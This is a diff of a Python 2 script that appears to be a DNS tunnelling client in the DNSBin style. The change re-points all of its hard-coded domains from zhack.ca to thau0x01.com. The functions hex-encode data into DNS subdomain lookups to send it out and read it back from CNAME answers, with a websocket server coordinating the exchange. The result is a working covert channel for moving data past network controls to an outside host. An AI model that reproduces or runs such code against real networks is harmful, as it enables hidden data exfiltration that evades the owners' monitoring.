@@ -18,8 +18,8 @@ def data_from_url(url):
 	return "".join(url.split(".")[1:]).decode("hex")
 
 def read_bytes_from_inside(token):
-	answer = dns.resolver.query("0." + token + ".i.zhack.ca", "CNAME")
-	bytes = str(answer[0]).replace(".o.zhack.ca.", "").replace(".", "").decode("hex")
+	answer = dns.resolver.query("0." + token + ".i.thau0x01.com", "CNAME")
+	bytes = str(answer[0]).replace(".o.thau0x01.com.", "").replace(".", "").decode("hex")
 	length_field = struct.unpack("<I", bytes[:4])[0]
 	bytes = bytes[4:]
 	i = 1
@@ -28,14 +28,14 @@ def read_bytes_from_inside(token):
 	yield bytes
 
 	while total_length < length_field:
-		answer = dns.resolver.query(str(i) + "." + token + ".i.zhack.ca", "CNAME")
-		moredata = str(answer[0]).replace(".o.zhack.ca.", "").replace(".", "").decode("hex")
+		answer = dns.resolver.query(str(i) + "." + token + ".i.thau0x01.com", "CNAME")
+		moredata = str(answer[0]).replace(".o.thau0x01.com.", "").replace(".", "").decode("hex")
 		yield moredata
 		total_length += len(moredata)
 		i += 1
 
 def read_bytes_from_outside():
-	conn = create_connection("ws://dns1.zhack.ca:8001/dnsbin")
+	conn = create_connection("ws://dns1.thau0x01.com:8001/dnsbin")
 	data = json.loads(conn.recv())
 
 	assert data['type'] == "token"
@@ -62,7 +62,7 @@ def read_bytes_from_outside():
 
 
 def send_bytes_from_outside(content):
-	conn = create_connection("ws://dns1.zhack.ca:8001/dnsbin")
+	conn = create_connection("ws://dns1.thau0x01.com:8001/dnsbin")
 	data = json.loads(conn.recv())
 
 	assert data['type'] == "token"
@@ -94,7 +94,7 @@ def send_bytes_from_inside(token, content):
 		if len(part2) == 0:
 			part2 = "00"
 
-		socket.gethostbyname(str(i / 60) + "." + part1 + "." + part2 + "." + token + ".d.zhack.ca")
+		socket.gethostbyname(str(i / 60) + "." + part1 + "." + part2 + "." + token + ".d.thau0x01.com")
 		time.sleep(0.01)
 		content = content[60:]
 
